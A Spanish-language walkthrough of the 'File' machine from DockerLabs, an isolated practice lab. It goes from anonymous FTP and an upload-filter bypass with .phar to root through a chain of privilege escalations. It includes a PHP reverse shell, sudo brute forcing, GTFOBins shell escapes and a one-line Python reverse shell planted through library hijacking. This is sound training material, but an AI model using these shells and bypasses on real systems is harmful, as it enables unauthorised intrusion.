# DockerLabs - File

Máquina **File** de DockerLabs (dificultad fácil). Un recorrido muy completo para practicar: FTP anónimo, fuzzing web, bypass de subida de archivos, esteganografía, fuerza bruta de sudo y una cadena de escalada de privilegios encadenando varios usuarios hasta root vía secuestro de librería en Python.

> Entorno de laboratorio local (contenedor Docker en `172.17.0.2`). Todo el ejercicio es sobre una máquina intencionadamente vulnerable y aislada.

---

## 1. Reconocimiento

Escaneo completo de puertos con detección de versiones y scripts:

```
nmap -sVC -p- --min-rate 5000 -T4 172.17.0.2 -oG allports.txt
```

Dos puertos abiertos:

| Puerto | Servicio | Versión |
|---|---|---|
| 21/tcp | FTP | vsftpd 3.0.5 (login anónimo permitido) |
| 80/tcp | HTTP | Apache httpd 2.4.41 (Ubuntu) |

Lo más llamativo: nmap ya nos avisa de que el FTP permite **login anónimo** y hay un fichero `anon.txt` esperando.

---

## 2. FTP anónimo

Entramos con el usuario `Anonymous` (sin contraseña) y nos bajamos el fichero:

```
ftp 172.17.0.2
# Name: Anonymous
# Password: (vacío)
ftp> get anon.txt
ftp> exit
```

Contenido:

```
53dd9c6005f3cdfc5a69c5c07388016d
```

Un hash MD5. Lo pasamos por hashes.com (o john/hashcat) y crackea a:

```
53dd9c6005f3cdfc5a69c5c07388016d:justin
```

Nos guardamos `justin` para más adelante. Todavía no sabemos de qué es, pero en estas máquinas un nombre suelto casi siempre acaba siendo credencial de algo.

---

## 3. Enumeración web

La raíz del puerto 80 es la página por defecto de Apache. Pero en el código fuente hay una pista:

```html
<!-- El que hizo la web no quiso trabajar mucho, por eso hizo un directorio raro ;D -->
```

Nos invita a fuzzear directorios. Primera pasada:

```
gobuster dir -u "http://172.17.0.2/" -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Aparece `/uploads` (301) y `/server-status` (403). El `/uploads` es un index vacío, así que buscamos el vector de subida añadiendo extensiones:

```
gobuster dir -u "http://172.17.0.2/" -w /opt/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,css,docx,zip,log,tar -b 404
```

Bingo:

```
/file_upload.php      (Status: 200)
```

El formulario es mínimo: un `<input type="file">` que postea a `subir_archivo.php` con `multipart/form-data`.

---

## 4. Explotación: bypass de subida con .phar

El objetivo es subir una webshell/reverse shell en PHP. Partimos de la clásica:

```
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
nvim shell.php
# $ip   = '172.17.0.1';
# $port = 4444;
```

Al subir `shell.php` directamente da error genérico ("Hubo un error al subir el archivo"), señal de que hay un filtro de extensiones. Para encontrar una extensión permitida que **siga ejecutándose como PHP**, interceptamos con Burp y mandamos la petición al **Intruder**, marcando la extensión del `filename` como posición de payload:

```
Content-Disposition: form-data; name="archivo"; filename="shell.§php§"
```

Cargamos una lista de extensiones PHP alternativas (php2, php3, php4, php5, phtml, phar, pht...) y lanzamos el ataque. La respuesta delata la buena por tamaño:

```
.phar  ->  Length = 250  (las demás 236-237)
HTTP/1.1 200 OK
El archivo shell.phar ha sido subido con exito.
```

### ¿Por qué funciona `.phar`?

El filtro de subida usa una **lista negra** de extensiones (bloquea `.php` y poco más), pero Apache tiene mapeada la extensión `.phar` al mismo handler de PHP. Resultado: el fichero esquiva el filtro por nombre pero el servidor lo sigue interpretando y ejecutando como código PHP. Lección: una lista negra de extensiones casi nunca es suficiente; las variantes `.phar`, `.phtml`, `.pht` suelen colarse.

---

## 5. Acceso inicial (www-data)

Ponemos el listener (yo uso penelope, pero vale nc o lo que prefieras):

```
penelope        # escuchando en 0.0.0.0:4444
```

Y ejecutamos la shell visitando:

```
http://172.17.0.2/uploads/shell.phar
```

Shell recibida:

```
www-data@3f37af44cd78:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

En `/etc/passwd` vemos varios usuarios con shell válida: `fernando`, `mario`, `julen`, `iker` (más root). Esos son los peldaños de la escalada.

---

## 6. Escalada: www-data → fernando (fuerza bruta de sudo)

Sin pistas directas, probamos fuerza bruta de contraseñas de usuario usando [Sudo_BruteForce](https://github.com/Maalfer/Sudo_BruteForce). Lo servimos desde la máquina atacante y lo bajamos al objetivo:

```
# Atacante
python3 -m http.server

# Víctima (/tmp)
wget http://172.17.0.1:8000/Linux-Su-Force.sh
wget http://172.17.0.1:8000/rockyou.txt
```

Fuerza bruta contra `fernando`:

```
bash Linux-Su-Force.sh fernando rockyou.txt
# Contraseña encontrada para el usuario fernando: chocolate
```

> Nota de higiene: subir rockyou.txt (133 MB) al `/tmp` del objetivo deja mucho ruido. En un pentest real conviene borrarlo al terminar (`rm /tmp/rockyou.txt`).

---

## 7. Escalada: fernando → mario (esteganografía)

En el home de `fernando` hay una imagen sospechosa:

```
fernando@...:~$ ls
dragon-medieval.jpeg
```

La bajamos a la atacante y la analizamos. `exiftool` no revela nada útil en metadatos, así que probamos esteganografía con `stegseek` (mucho más rápido que steghide a fuerza bruta):

```
stegseek --crack dragon-medieval.jpeg /opt/rockyou.txt
# [i] Found passphrase: "secret"
# [i] Original filename: "pass.txt"
```

El fichero extraído contiene un hash SHA1:

```
cbfdac6008f9cab4083784cbd1874f76618d2a97
```

Que en hashes.com crackea a:

```
cbfdac6008f9cab4083784cbd1874f76618d2a97:password123
```

Probamos esa contraseña por **reutilización de credenciales** contra el siguiente usuario y funciona:

```
fernando@...:~$ su mario
# Password: password123
mario@...:~$ id
uid=1001(mario) ...
```

---

## 8. Escalada: mario → julen (awk vía sudo)

```
mario@...:~$ sudo -l
User mario may run the following commands on 3f37af44cd78:
    (julen) NOPASSWD: /usr/bin/awk
```

`awk` permite ejecutar comandos del sistema, así que según [GTFOBins](https://gtfobins.github.io/gtfobins/awk/) saltamos a `julen`:

```
sudo -u julen awk 'BEGIN {system("/bin/sh")}'
# estabilizamos
script /dev/null -c bash
export TERM=xterm
```

---

## 9. Escalada: julen → iker (env vía sudo)

```
julen@...:~$ sudo -l
User julen may run the following commands on 3f37af44cd78:
    (iker) NOPASSWD: /usr/bin/env
```

`env` puede lanzar binarios arbitrarios ([GTFOBins](https://gtfobins.github.io/gtfobins/env/)), así que saltamos a `iker`:

```
sudo -u iker env bash
# uid=1003(iker)
```

---

## 10. Escalada final: iker → root (secuestro de librería en Python)

El permiso de sudo de `iker` es el interesante:

```
iker@...:~$ sudo -l
User iker may run the following commands on 3f37af44cd78:
    (ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py
```

El script:

```python
import requests
ip = input('Introduce la direccion IP que quieras geolocalizar: ')
respuesta = requests.get(f'http://ip-api.com/json/{ip}')
data = respuesta.json()
print(data)
```

### El vector: CWD en sys.path

Cuando ejecutas un script de Python, el **directorio del script** (aquí `/home/iker`) entra en `sys.path`, y Python lo mira **antes** que las librerías del sistema al resolver un `import`. El script hace `import requests` y nosotros tenemos permiso de escritura en `/home/iker`. Si creamos ahí un fichero llamado `requests.py`, Python importará el nuestro en lugar de la librería real, y como el script corre con `sudo` como root, nuestro código se ejecuta como root.

Creamos el `requests.py` malicioso con una reverse shell (hacia un segundo listener en el 8888):

```
echo 'import os,pty,socket;s=socket.socket();s.connect(("172.17.0.1",8888));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")' > requests.py
```

Y disparamos el script privilegiado:

```
sudo -u root /usr/bin/python3 /home/iker/geo_ip.py
```

En cuanto Python ejecuta el `import requests`, se lanza nuestra shell:

```
root@3f37af44cd78:/home/iker#
```

**Máquina pwned.**